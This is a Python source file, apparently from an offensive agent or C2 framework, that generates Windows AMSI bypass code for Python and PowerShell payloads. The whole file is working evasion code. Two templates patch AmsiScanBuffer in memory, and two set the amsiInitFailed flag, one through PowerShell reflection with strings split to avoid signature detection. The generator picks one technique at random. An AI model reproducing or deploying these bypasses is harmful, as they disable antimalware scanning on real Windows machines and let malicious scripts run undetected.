"""AMSI bypass code generation for Python and PowerShell agents."""

from __future__ import annotations

import random
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from evasion import EvasionConfig


def _python_patch_amsi_scan_buffer() -> str:
    return '''\
def patch_amsi():
    try:
        import sys
        if sys.platform != 'win32':
            return
        import ctypes
        import ctypes.wintypes as wt
        kernel32 = ctypes.windll.kernel32
        amsi_dll = ctypes.windll.LoadLibrary("amsi.dll")
        scan_buf_addr = ctypes.windll.kernel32.GetProcAddress(
            ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll"),
            b"AmsiScanBuffer"
        )
        if not scan_buf_addr:
            return
        patch_bytes = b'\\xb8\\x57\\x00\\x07\\x80\\xc3'
        patch_size = len(patch_bytes)
        old_protect = wt.DWORD(0)
        result = kernel32.VirtualProtect(
            ctypes.c_void_p(scan_buf_addr),
            patch_size,
            0x40,
            ctypes.byref(old_protect)
        )
        if not result:
            return
        ctypes.memmove(ctypes.c_void_p(scan_buf_addr), patch_bytes, patch_size)
        restored = wt.DWORD(0)
        kernel32.VirtualProtect(
            ctypes.c_void_p(scan_buf_addr),
            patch_size,
            old_protect.value,
            ctypes.byref(restored)
        )
    except Exception:
        pass
'''


def _python_amsi_init_failed() -> str:
    return '''\
def patch_amsi():
    try:
        import sys
        if sys.platform != 'win32':
            return
        import ctypes
        import ctypes.wintypes as wt
        amsi_dll = ctypes.windll.LoadLibrary("amsi.dll")
        handle = ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll")
        if not handle:
            return
        amsi_init_failed_addr = ctypes.windll.kernel32.GetProcAddress(
            handle, b"AmsiInitialize"
        )
        if not amsi_init_failed_addr:
            return
        context_offset = 16
        flag_addr = ctypes.c_void_p(amsi_init_failed_addr + context_offset)
        old_protect = wt.DWORD(0)
        ctypes.windll.kernel32.VirtualProtect(
            flag_addr, 1, 0x40, ctypes.byref(old_protect)
        )
        ctypes.memset(flag_addr, 1, 1)
        restored = wt.DWORD(0)
        ctypes.windll.kernel32.VirtualProtect(
            flag_addr, 1, old_protect.value, ctypes.byref(restored)
        )
    except Exception:
        pass
'''


def _powershell_patch_amsi_scan_buffer() -> str:
    return '''\
function patch_amsi {
    try {
        if ([System.Environment]::OSVersion.Platform -ne 'Win32NT') { return }
        $AmsiCode = @"
using System;
using System.Runtime.InteropServices;
public class AmsiPatcher {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr hModule = GetModuleHandle("am" + "si.dll");
        if (hModule == IntPtr.Zero) return;
        IntPtr funcAddr = GetProcAddress(hModule, "Amsi" + "Scan" + "Buffer");
        if (funcAddr == IntPtr.Zero) return;
        uint oldProtect = 0;
        VirtualProtect(funcAddr, (UIntPtr)6, 0x40, out oldProtect);
        byte[] patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patchBytes, 0, funcAddr, 6);
        uint restored = 0;
        VirtualProtect(funcAddr, (UIntPtr)6, oldProtect, out restored);
    }
}
"@
        Add-Type -TypeDefinition $AmsiCode -Language CSharp
        [AmsiPatcher]::Patch()
    } catch { }
}
'''


def _powershell_amsi_init_failed() -> str:
    return '''\
function patch_amsi {
    try {
        if ([System.Environment]::OSVersion.Platform -ne 'Win32NT') { return }
        $utilsName = "Am" + "si" + "Ut" + "ils"
        $refAssembly = [Ref].Assembly
        $amsiUtils = $refAssembly.GetType(
            "System.Management.Automation." + $utilsName
        )
        if ($amsiUtils -eq $null) { return }
        $fieldName = "s_am" + "siIn" + "itFa" + "iled"
        $initField = $amsiUtils.GetField(
            $fieldName,
            [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
        )
        if ($initField -eq $null) { return }
        $initField.SetValue($null, $true)
    } catch { }
}
'''


def generate_code(lang: str, config: EvasionConfig) -> str:
    """Generate AMSI bypass code for the given language.

    Returns empty string for unsupported languages (javascript, vbscript).
    Randomly selects one bypass technique at generation time.
    """
    if lang not in ("python", "powershell"):
        return ""

    technique = random.choice(["patch", "flag"])

    if lang == "python":
        if technique == "patch":
            return _python_patch_amsi_scan_buffer()
        else:
            return _python_amsi_init_failed()
    else:
        if technique == "patch":
            return _powershell_patch_amsi_scan_buffer()
        else:
            return _powershell_amsi_init_failed()
